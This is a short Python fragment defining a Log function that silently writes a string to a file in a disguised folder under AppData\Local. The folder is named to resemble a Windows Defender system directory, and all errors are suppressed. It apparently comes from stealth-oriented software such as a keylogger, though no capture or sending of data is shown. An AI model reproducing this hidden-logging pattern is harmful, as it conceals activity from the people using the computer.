from os import environ, sep

def Log(string):
    try:
        pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
        f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w+', encoding='utf-8')
        f.write(string+'\n')
        f.close()
    except:
        pass